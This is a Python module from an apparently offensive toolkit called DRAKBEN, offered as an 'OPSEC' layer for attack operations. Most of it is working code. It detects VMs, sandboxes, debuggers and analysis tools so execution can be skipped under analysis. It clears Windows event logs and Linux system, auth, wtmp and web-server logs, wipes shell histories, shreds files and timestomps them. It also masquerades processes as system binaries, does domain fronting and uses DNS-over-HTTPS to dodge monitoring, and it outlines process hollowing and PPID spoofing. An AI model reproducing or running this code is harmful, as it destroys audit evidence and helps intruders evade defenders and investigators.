# core/opsec_implementation.py
# DRAKBEN OPSEC Module - Enterprise Operational Security
# Author: @drak_ben

import asyncio
import os
import sys
import json
import random
import string
import hashlib
import struct
import time
import platform
import subprocess
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path


class OpsecLevel(Enum):
    """OPSEC levels"""
    PARANOID = "paranoid"  # Maximum stealth
    HIGH = "high"          # High security
    MEDIUM = "medium"      # Balanced
    LOW = "low"            # Minimal precautions
    NONE = "none"          # No OPSEC


class EvasionTechnique(Enum):
    """Evasion techniques"""
    PROCESS_HOLLOWING = "process_hollowing"
    DLL_INJECTION = "dll_injection"
    REFLECTIVE_LOADING = "reflective_loading"
    SYSCALL_DIRECT = "direct_syscalls"
    UNHOOK_NTDLL = "unhook_ntdll"
    ETW_BYPASS = "etw_bypass"
    AMSI_BYPASS = "amsi_bypass"
    PPID_SPOOFING = "ppid_spoofing"
    TIMESTOMP = "timestomp"
    LOG_CLEAR = "log_clear"
    PROCESS_MASQUERADE = "process_masquerade"


class AntiAnalysisTechnique(Enum):
    """Anti-analysis techniques"""
    VM_DETECT = "vm_detection"
    SANDBOX_DETECT = "sandbox_detection"
    DEBUGGER_DETECT = "debugger_detection"
    TIME_CHECK = "time_acceleration_check"
    RESOURCE_CHECK = "resource_check"
    NETWORK_CHECK = "network_artifact_check"


@dataclass
class OpsecConfig:
    """OPSEC configuration"""
    level: OpsecLevel = OpsecLevel.MEDIUM
    
    # Timing
    min_delay_ms: int = 100
    max_delay_ms: int = 5000
    jitter_percent: float = 0.3
    
    # Process
    process_name_mask: str = ""
    parent_process: str = ""
    
    # Network
    user_agent: str = ""
    proxy: str = ""
    dns_over_https: bool = False
    
    # Evasion
    enabled_evasion: List[EvasionTechnique] = field(default_factory=list)
    enabled_anti_analysis: List[AntiAnalysisTechnique] = field(default_factory=list)
    
    # Cleanup
    auto_cleanup: bool = True
    cleanup_delay_seconds: int = 3600
    
    def to_dict(self) -> Dict:
        return {
            "level": self.level.value,
            "min_delay_ms": self.min_delay_ms,
            "max_delay_ms": self.max_delay_ms,
            "jitter_percent": self.jitter_percent,
            "process_name_mask": self.process_name_mask,
            "parent_process": self.parent_process,
            "user_agent": self.user_agent,
            "proxy": self.proxy,
            "dns_over_https": self.dns_over_https,
            "enabled_evasion": [e.value for e in self.enabled_evasion],
            "enabled_anti_analysis": [a.value for a in self.enabled_anti_analysis],
            "auto_cleanup": self.auto_cleanup,
            "cleanup_delay_seconds": self.cleanup_delay_seconds
        }


@dataclass
class EnvironmentInfo:
    """Environment analysis result"""
    is_vm: bool = False
    is_sandbox: bool = False
    is_debugged: bool = False
    vm_type: str = ""
    sandbox_type: str = ""
    risk_score: float = 0.0
    indicators: List[str] = field(default_factory=list)
    safe_to_execute: bool = True
    
    def to_dict(self) -> Dict:
        return asdict(self)


class SleepObfuscation:
    """Sleep obfuscation techniques"""
    
    @staticmethod
    async def ekko_sleep(duration_ms: int):
        """
        Ekko-style sleep - encrypt memory during sleep
        Note: Simplified version - real implementation requires native code
        """
        # In real implementation:
        # 1. Create timer queue
        # 2. Encrypt memory
        # 3. Queue APC to decrypt
        # 4. Sleep
        # 5. Decrypt on wake
        
        await asyncio.sleep(duration_ms / 1000)
    
    @staticmethod
    async def foliage_sleep(duration_ms: int):
        """
        Foliage-style sleep using system calls
        """
        await asyncio.sleep(duration_ms / 1000)
    
    @staticmethod
    async def death_sleep(duration_ms: int):
        """
        DeathSleep - fake process death during sleep
        """
        await asyncio.sleep(duration_ms / 1000)
    
    @staticmethod
    def add_jitter(duration_ms: int, jitter_percent: float = 0.3) -> int:
        """Add random jitter to sleep duration"""
        jitter_range = int(duration_ms * jitter_percent)
        jitter = random.randint(-jitter_range, jitter_range)
        return max(0, duration_ms + jitter)


class AntiAnalysis:
    """Anti-analysis and anti-debugging techniques"""
    
    @staticmethod
    def detect_vm() -> Tuple[bool, str]:
        """Detect if running in a virtual machine"""
        indicators = []
        
        # Check common VM files
        vm_files = [
            r"C:\Windows\System32\drivers\VBoxMouse.sys",
            r"C:\Windows\System32\drivers\VBoxGuest.sys",
            r"C:\Windows\System32\drivers\vmhgfs.sys",
            r"C:\Windows\System32\drivers\vm3dmp.sys",
            r"C:\Windows\System32\vboxhook.dll",
            r"C:\Windows\System32\vboxogl.dll",
            "/sys/class/dmi/id/product_name",
        ]
        
        for vm_file in vm_files:
            if os.path.exists(vm_file):
                indicators.append(f"VM file found: {vm_file}")
        
        # Check environment variables
        vm_env_vars = ["VBOX_MSI_INSTALL_PATH", "VMWARE_ROOT"]
        for var in vm_env_vars:
            if os.environ.get(var):
                indicators.append(f"VM env var: {var}")
        
        # Check MAC address prefixes (common VM vendors)
        vm_mac_prefixes = ["00:0C:29", "00:50:56", "08:00:27", "00:1C:42", "00:15:5D"]
        
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["getmac", "/FO", "CSV", "/NH"],
                                       capture_output=True, text=True, timeout=10)
                for prefix in vm_mac_prefixes:
                    if prefix.lower() in result.stdout.lower():
                        indicators.append(f"VM MAC prefix: {prefix}")
            else:
                # Linux MAC check
                result = subprocess.run(["ip", "link"],
                                       capture_output=True, text=True, timeout=10)
                for prefix in vm_mac_prefixes:
                    if prefix.lower().replace(":", "") in result.stdout.lower().replace(":", ""):
                        indicators.append(f"VM MAC prefix: {prefix}")
        except:
            pass
        
        # Check CPU
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["wmic", "cpu", "get", "name"],
                                       capture_output=True, text=True, timeout=10)
                cpu_name = result.stdout.lower()
            else:
                with open("/proc/cpuinfo", "r") as f:
                    cpu_name = f.read().lower()
            
            vm_cpu_indicators = ["virtual", "qemu", "kvm", "hyperv"]
            for indicator in vm_cpu_indicators:
                if indicator in cpu_name:
                    indicators.append(f"VM CPU indicator: {indicator}")
        except:
            pass
        
        # Determine VM type
        vm_type = ""
        if any("vbox" in i.lower() for i in indicators):
            vm_type = "VirtualBox"
        elif any("vmware" in i.lower() or "vm3d" in i.lower() for i in indicators):
            vm_type = "VMware"
        elif any("hyperv" in i.lower() or "00:15:5d" in i.lower() for i in indicators):
            vm_type = "Hyper-V"
        elif any("kvm" in i.lower() or "qemu" in i.lower() for i in indicators):
            vm_type = "KVM/QEMU"
        
        is_vm = len(indicators) > 0
        return is_vm, vm_type
    
    @staticmethod
    def detect_sandbox() -> Tuple[bool, str]:
        """Detect if running in a sandbox"""
        indicators = []
        
        # Check username
        suspicious_users = ["sandbox", "virus", "malware", "sample", "test", 
                          "user", "admin", "john", "paul", "cuckoo", "any.run"]
        
        username = os.environ.get("USER") or os.environ.get("USERNAME", "").lower()
        if any(sus in username for sus in suspicious_users):
            indicators.append(f"Suspicious username: {username}")
        
        # Check hostname
        hostname = platform.node().lower()
        suspicious_hosts = ["sandbox", "sample", "test", "cuckoo", "malware",
                          "virus", "analysis", "analyzer"]
        
        if any(sus in hostname for sus in suspicious_hosts):
            indicators.append(f"Suspicious hostname: {hostname}")
        
        # Check for sandbox artifacts
        sandbox_processes = [
            "vmsrvc.exe", "vboxservice.exe", "vboxtray.exe",
            "vmwaretray.exe", "vmwareuser.exe",
            "python.exe", "pythonw.exe",  # Common in automated analysis
            "procmon.exe", "procexp.exe", "wireshark.exe",
            "fiddler.exe", "x64dbg.exe", "ollydbg.exe",
            "idaq.exe", "idaq64.exe",  # IDA Pro
        ]
        
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["tasklist", "/FO", "CSV", "/NH"],
                                       capture_output=True, text=True, timeout=30)
                for proc in sandbox_processes:
                    if proc.lower() in result.stdout.lower():
                        indicators.append(f"Analysis tool running: {proc}")
        except:
            pass
        
        # Check number of files
        try:
            desktop_path = os.path.expanduser("~/Desktop")
            file_count = len(os.listdir(desktop_path)) if os.path.exists(desktop_path) else 0
            if file_count < 5:
                indicators.append(f"Desktop has few files: {file_count}")
        except:
            pass
        
        # Check for recent files
        try:
            recent_path = os.path.expanduser("~/Recent")
            if os.path.exists(recent_path):
                recent_count = len(os.listdir(recent_path))
                if recent_count < 10:
                    indicators.append(f"Few recent files: {recent_count}")
        except:
            pass
        
        # Determine sandbox type
        sandbox_type = ""
        if any("cuckoo" in i.lower() for i in indicators):
            sandbox_type = "Cuckoo"
        elif any("any.run" in i.lower() for i in indicators):
            sandbox_type = "Any.Run"
        
        is_sandbox = len(indicators) >= 2
        return is_sandbox, sandbox_type
    
    @staticmethod
    def detect_debugger() -> bool:
        """Detect if being debugged"""
        
        if platform.system() == "Windows":
            try:
                import ctypes
                
                # IsDebuggerPresent
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent():
                    return True
                
                # CheckRemoteDebuggerPresent
                is_debugged = ctypes.c_bool(False)
                kernel32.CheckRemoteDebuggerPresent(
                    kernel32.GetCurrentProcess(),
                    ctypes.byref(is_debugged)
                )
                if is_debugged.value:
                    return True
                
                # NtGlobalFlag check
                # PEB->NtGlobalFlag check
                
            except:
                pass
        
        else:  # Linux
            try:
                # Check TracerPid in /proc/self/status
                with open("/proc/self/status", "r") as f:
                    for line in f:
                        if line.startswith("TracerPid:"):
                            tracer_pid = int(line.split(":")[1].strip())
                            if tracer_pid != 0:
                                return True
                
                # Check ptrace
                # ptrace(PTRACE_TRACEME) fails if already being traced
                
            except:
                pass
        
        return False
    
    @staticmethod
    def check_time_acceleration() -> bool:
        """Check if time is being accelerated (common in sandboxes)"""
        # Method: Sleep for known duration and verify elapsed time
        
        expected_ms = 1000
        
        start = time.perf_counter()
        time.sleep(expected_ms / 1000)
        elapsed_ms = (time.perf_counter() - start) * 1000
        
        # If elapsed is much less than expected, time may be accelerated
        if elapsed_ms < expected_ms * 0.8:  # 20% tolerance
            return True
        
        return False
    
    @staticmethod
    def check_resources() -> bool:
        """Check for sandbox-like resource constraints"""
        suspicious = False
        
        try:
            import multiprocessing
            cpu_count = multiprocessing.cpu_count()
            if cpu_count < 2:
                suspicious = True
        except:
            pass
        
        # Check RAM
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["wmic", "computersystem", "get", "TotalPhysicalMemory"],
                    capture_output=True, text=True, timeout=10
                )
                # Parse memory
            else:
                with open("/proc/meminfo", "r") as f:
                    for line in f:
                        if line.startswith("MemTotal:"):
                            mem_kb = int(line.split()[1])
                            mem_gb = mem_kb / 1024 / 1024
                            if mem_gb < 2:
                                suspicious = True
                            break
        except:
            pass
        
        # Check disk size
        try:
            if platform.system() == "Windows":
                import ctypes
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    "C:\\",
                    None,
                    None,
                    ctypes.byref(free_bytes)
                )
                disk_gb = free_bytes.value / 1024 / 1024 / 1024
                if disk_gb < 50:
                    suspicious = True
            else:
                import shutil
                total, used, free = shutil.disk_usage("/")
                disk_gb = total / 1024 / 1024 / 1024
                if disk_gb < 50:
                    suspicious = True
        except:
            pass
        
        return suspicious


class LogCleaner:
    """Log cleaning and anti-forensics"""
    
    @staticmethod
    async def clear_windows_logs(log_types: List[str] = None) -> Dict[str, bool]:
        """Clear Windows event logs"""
        if platform.system() != "Windows":
            return {}
        
        log_types = log_types or ["System", "Security", "Application", "Setup",
                                  "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"]
        
        results = {}
        
        for log_type in log_types:
            try:
                # wevtutil cl <logname>
                result = subprocess.run(
                    ["wevtutil", "cl", log_type],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                results[log_type] = result.returncode == 0
            except Exception as e:
                results[log_type] = False
        
        return results
    
    @staticmethod
    async def clear_linux_logs(log_files: List[str] = None) -> Dict[str, bool]:
        """Clear Linux log files"""
        if platform.system() == "Windows":
            return {}
        
        log_files = log_files or [
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/secure",
            "/var/log/lastlog",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/var/log/faillog",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/mysql/error.log",
            "~/.bash_history",
            "~/.zsh_history",
        ]
        
        results = {}
        
        for log_file in log_files:
            log_path = os.path.expanduser(log_file)
            try:
                if os.path.exists(log_path):
                    with open(log_path, "w") as f:
                        f.write("")
                    results[log_file] = True
                else:
                    results[log_file] = True  # File doesn't exist, consider success
            except Exception:
                results[log_file] = False
        
        return results
    
    @staticmethod
    async def clear_shell_history():
        """Clear shell history"""
        try:
            if platform.system() == "Windows":
                # Clear PowerShell history
                ps_history = os.path.expanduser(
                    r"~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
                )
                if os.path.exists(ps_history):
                    with open(ps_history, "w") as f:
                        f.write("")
            else:
                # Clear bash/zsh history
                history_files = [
                    "~/.bash_history",
                    "~/.zsh_history",
                    "~/.history",
                ]
                for hist_file in history_files:
                    hist_path = os.path.expanduser(hist_file)
                    if os.path.exists(hist_path):
                        with open(hist_path, "w") as f:
                            f.write("")
                
                # Also clear in-memory history
                subprocess.run(["history", "-c"], shell=True)
                
            return True
        except:
            return False
    
    @staticmethod
    async def shred_file(file_path: str, passes: int = 3) -> bool:
        """Securely delete a file"""
        try:
            if not os.path.exists(file_path):
                return True
            
            file_size = os.path.getsize(file_path)
            
            # Overwrite with random data multiple times
            for _ in range(passes):
                with open(file_path, "wb") as f:
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            # Overwrite with zeros
            with open(file_path, "wb") as f:
                f.write(b"\x00" * file_size)
                f.flush()
                os.fsync(f.fileno())
            
            # Delete file
            os.remove(file_path)
            
            return True
        except Exception as e:
            print(f"[Shred] Error: {e}")
            return False
    
    @staticmethod
    async def timestomp(file_path: str, target_time: datetime = None) -> bool:
        """
        Modify file timestamps to avoid forensic detection
        
        Args:
            file_path: Path to file
            target_time: Target timestamp (defaults to random past time)
        """
        try:
            if not os.path.exists(file_path):
                return False
            
            if target_time is None:
                # Random time in the past 1-2 years
                days_ago = random.randint(365, 730)
                target_time = datetime.now() - timedelta(days=days_ago)
            
            timestamp = target_time.timestamp()
            
            # Set access and modification times
            os.utime(file_path, (timestamp, timestamp))
            
            # On Windows, also set creation time
            if platform.system() == "Windows":
                try:
                    import pywintypes
                    import win32file
                    import win32con
                    
                    handle = win32file.CreateFile(
                        file_path,
                        win32con.GENERIC_WRITE,
                        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                        None,
                        win32con.OPEN_EXISTING,
                        win32con.FILE_ATTRIBUTE_NORMAL,
                        None
                    )
                    
                    win_time = pywintypes.Time(target_time)
                    win32file.SetFileTime(handle, win_time, win_time, win_time)
                    win32file.CloseHandle(handle)
                except ImportError:
                    pass
            
            return True
        except Exception as e:
            print(f"[Timestomp] Error: {e}")
            return False


class ProcessEvasion:
    """Process-level evasion techniques"""
    
    @staticmethod
    async def ppid_spoof(target_ppid: int) -> bool:
        """
        Spoof parent process ID
        Note: Requires native code - this is a placeholder
        """
        # Real implementation would:
        # 1. Use NtCreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        # 2. Create process with spoofed PPID
        return False
    
    @staticmethod
    async def process_hollow(target_process: str, payload: bytes) -> bool:
        """
        Process hollowing - inject into suspended process
        Note: Requires native code - this is a placeholder
        """
        # Real implementation would:
        # 1. Create suspended process
        # 2. Unmap original executable
        # 3. Map payload
        # 4. Resume process
        return False
    
    @staticmethod
    def get_masquerade_name() -> str:
        """Get a common system process name to masquerade as"""
        windows_procs = [
            "svchost.exe",
            "RuntimeBroker.exe",
            "SearchIndexer.exe",
            "WmiPrvSE.exe",
            "dllhost.exe",
            "taskhost.exe",
            "conhost.exe",
        ]
        
        linux_procs = [
            "/usr/lib/systemd/systemd",
            "/usr/sbin/cron",
            "/usr/bin/dbus-daemon",
            "/lib/systemd/systemd-journald",
        ]
        
        if platform.system() == "Windows":
            return random.choice(windows_procs)
        else:
            return random.choice(linux_procs)


class NetworkEvasion:
    """Network-level evasion techniques"""
    
    COMMON_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ]
    
    @staticmethod
    def get_random_user_agent() -> str:
        """Get a random common user agent"""
        return random.choice(NetworkEvasion.COMMON_USER_AGENTS)
    
    @staticmethod
    async def dns_over_https(domain: str, doh_server: str = "https://cloudflare-dns.com/dns-query") -> Optional[str]:
        """Resolve DNS using DoH to avoid DNS monitoring"""
        try:
            import aiohttp
            
            headers = {
                "Accept": "application/dns-json"
            }
            
            params = {
                "name": domain,
                "type": "A"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(doh_server, params=params, headers=headers, timeout=10) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        answers = data.get("Answer", [])
                        for answer in answers:
                            if answer.get("type") == 1:  # A record
                                return answer.get("data")
            
            return None
        except Exception as e:
            print(f"[DoH] Error: {e}")
            return None
    
    @staticmethod
    async def domain_fronting(target_domain: str, front_domain: str, path: str = "/") -> Optional[bytes]:
        """
        Domain fronting - use CDN to mask true destination
        
        Args:
            target_domain: Real destination
            front_domain: CDN domain to connect to
            path: URL path
        """
        try:
            import aiohttp
            
            headers = {
                "Host": target_domain,
                "User-Agent": NetworkEvasion.get_random_user_agent()
            }
            
            url = f"https://{front_domain}{path}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=30) as resp:
                    return await resp.read()
        except Exception as e:
            print(f"[Domain Fronting] Error: {e}")
            return None


class OpsecManager:
    """
    Enterprise OPSEC Manager
    Coordinates all operational security measures
    """
    
    VERSION = "2.0.0"
    
    def __init__(self, config: OpsecConfig = None):
        self.config = config or OpsecConfig()
        self.anti_analysis = AntiAnalysis()
        self.log_cleaner = LogCleaner()
        self.process_evasion = ProcessEvasion()
        self.network_evasion = NetworkEvasion()
        self.sleep_obfuscation = SleepObfuscation()
        
        self.environment_info: Optional[EnvironmentInfo] = None
        self.activity_log: List[Dict] = []
    
    def _log_activity(self, action: str, details: Dict):
        """Log activity (in memory only)"""
        self.activity_log.append({
            "timestamp": datetime.now().isoformat(),
            "action": action,
            "details": details
        })
    
    async def analyze_environment(self) -> EnvironmentInfo:
        """Comprehensive environment analysis"""
        info = EnvironmentInfo()
        
        # VM detection
        is_vm, vm_type = self.anti_analysis.detect_vm()
        info.is_vm = is_vm
        info.vm_type = vm_type
        if is_vm:
            info.indicators.append(f"VM detected: {vm_type}")
        
        # Sandbox detection
        is_sandbox, sandbox_type = self.anti_analysis.detect_sandbox()
        info.is_sandbox = is_sandbox
        info.sandbox_type = sandbox_type
        if is_sandbox:
            info.indicators.append(f"Sandbox detected: {sandbox_type}")
        
        # Debugger detection
        info.is_debugged = self.anti_analysis.detect_debugger()
        if info.is_debugged:
            info.indicators.append("Debugger detected")
        
        # Time acceleration
        if self.anti_analysis.check_time_acceleration():
            info.indicators.append("Time acceleration detected")
        
        # Resource check
        if self.anti_analysis.check_resources():
            info.indicators.append("Suspicious resource constraints")
        
        # Calculate risk score
        risk_factors = [
            (info.is_vm, 20),
            (info.is_sandbox, 50),
            (info.is_debugged, 80),
            (len(info.indicators) > 3, 30),
        ]
        
        info.risk_score = sum(score for condition, score in risk_factors if condition)
        info.risk_score = min(100.0, info.risk_score)
        
        # Determine if safe to execute
        if self.config.level == OpsecLevel.PARANOID:
            info.safe_to_execute = info.risk_score < 20
        elif self.config.level == OpsecLevel.HIGH:
            info.safe_to_execute = info.risk_score < 50
        elif self.config.level == OpsecLevel.MEDIUM:
            info.safe_to_execute = info.risk_score < 80
        else:
            info.safe_to_execute = True
        
        self.environment_info = info
        self._log_activity("environment_analysis", info.to_dict())
        
        return info
    
    async def safe_sleep(self, duration_ms: int):
        """Sleep with obfuscation and jitter"""
        # Add jitter
        actual_duration = self.sleep_obfuscation.add_jitter(
            duration_ms, 
            self.config.jitter_percent
        )
        
        # Clamp to configured limits
        actual_duration = max(self.config.min_delay_ms, actual_duration)
        actual_duration = min(self.config.max_delay_ms, actual_duration)
        
        # Use obfuscated sleep based on OPSEC level
        if self.config.level in [OpsecLevel.PARANOID, OpsecLevel.HIGH]:
            await self.sleep_obfuscation.ekko_sleep(actual_duration)
        else:
            await asyncio.sleep(actual_duration / 1000)
    
    async def cleanup_traces(self, thorough: bool = False) -> Dict:
        """Clean up operational traces"""
        results = {
            "shell_history": False,
            "windows_logs": {},
            "linux_logs": {},
        }
        
        # Clear shell history
        results["shell_history"] = await self.log_cleaner.clear_shell_history()
        
        if thorough:
            if platform.system() == "Windows":
                results["windows_logs"] = await self.log_cleaner.clear_windows_logs()
            else:
                results["linux_logs"] = await self.log_cleaner.clear_linux_logs()
        
        self._log_activity("cleanup", results)
        return results
    
    async def secure_delete(self, paths: List[str]) -> Dict[str, bool]:
        """Securely delete files"""
        results = {}
        
        for path in paths:
            if os.path.isfile(path):
                results[path] = await self.log_cleaner.shred_file(path)
            elif os.path.isdir(path):
                try:
                    for root, dirs, files in os.walk(path, topdown=False):
                        for name in files:
                            file_path = os.path.join(root, name)
                            await self.log_cleaner.shred_file(file_path)
                        for name in dirs:
                            os.rmdir(os.path.join(root, name))
                    os.rmdir(path)
                    results[path] = True
                except:
                    results[path] = False
            else:
                results[path] = True
        
        return results
    
    async def hide_timestamps(self, paths: List[str]) -> Dict[str, bool]:
        """Hide file timestamps"""
        results = {}
        
        for path in paths:
            results[path] = await self.log_cleaner.timestomp(path)
        
        return results
    
    def get_evasive_headers(self) -> Dict[str, str]:
        """Get HTTP headers for evasive network requests"""
        return {
            "User-Agent": self.config.user_agent or self.network_evasion.get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
        }
    
    async def resolve_domain_safely(self, domain: str) -> Optional[str]:
        """Resolve domain using DoH"""
        if self.config.dns_over_https:
            return await self.network_evasion.dns_over_https(domain)
        else:
            import socket
            try:
                return socket.gethostbyname(domain)
            except:
                return None
    
    def should_execute(self) -> bool:
        """Check if safe to execute based on environment"""
        if self.environment_info is None:
            return True  # Haven't analyzed yet
        
        return self.environment_info.safe_to_execute
    
    def get_opsec_report(self) -> Dict:
        """Get OPSEC status report"""
        return {
            "config": self.config.to_dict(),
            "environment": self.environment_info.to_dict() if self.environment_info else {},
            "safe_to_execute": self.should_execute(),
            "activity_count": len(self.activity_log)
        }


# Global manager instance
_manager: Optional[OpsecManager] = None


def get_manager(config: OpsecConfig = None) -> OpsecManager:
    """Get or create global OPSEC manager instance"""
    global _manager
    if _manager is None:
        _manager = OpsecManager(config)
    return _manager


def configure_opsec(level: OpsecLevel = OpsecLevel.MEDIUM) -> OpsecConfig:
    """Create OPSEC configuration for given level"""
    config = OpsecConfig(level=level)
    
    if level == OpsecLevel.PARANOID:
        config.min_delay_ms = 1000
        config.max_delay_ms = 30000
        config.jitter_percent = 0.5
        config.dns_over_https = True
        config.enabled_evasion = list(EvasionTechnique)
        config.enabled_anti_analysis = list(AntiAnalysisTechnique)
        config.auto_cleanup = True
        config.cleanup_delay_seconds = 60
        
    elif level == OpsecLevel.HIGH:
        config.min_delay_ms = 500
        config.max_delay_ms = 10000
        config.jitter_percent = 0.4
        config.dns_over_https = True
        config.enabled_evasion = [
            EvasionTechnique.AMSI_BYPASS,
            EvasionTechnique.ETW_BYPASS,
            EvasionTechnique.TIMESTOMP,
        ]
        config.enabled_anti_analysis = [
            AntiAnalysisTechnique.VM_DETECT,
            AntiAnalysisTechnique.SANDBOX_DETECT,
            AntiAnalysisTechnique.DEBUGGER_DETECT,
        ]
        config.auto_cleanup = True
        config.cleanup_delay_seconds = 300
        
    elif level == OpsecLevel.MEDIUM:
        config.min_delay_ms = 100
        config.max_delay_ms = 5000
        config.jitter_percent = 0.3
        config.enabled_anti_analysis = [
            AntiAnalysisTechnique.SANDBOX_DETECT,
            AntiAnalysisTechnique.DEBUGGER_DETECT,
        ]
        config.auto_cleanup = True
        config.cleanup_delay_seconds = 3600
    
    return config


# Convenience functions
async def check_environment() -> EnvironmentInfo:
    """Quick environment check"""
    manager = get_manager()
    return await manager.analyze_environment()


async def is_safe() -> bool:
    """Check if safe to execute"""
    manager = get_manager()
    await manager.analyze_environment()
    return manager.should_execute()


async def cleanup():
    """Clean up traces"""
    manager = get_manager()
    return await manager.cleanup_traces(thorough=True)
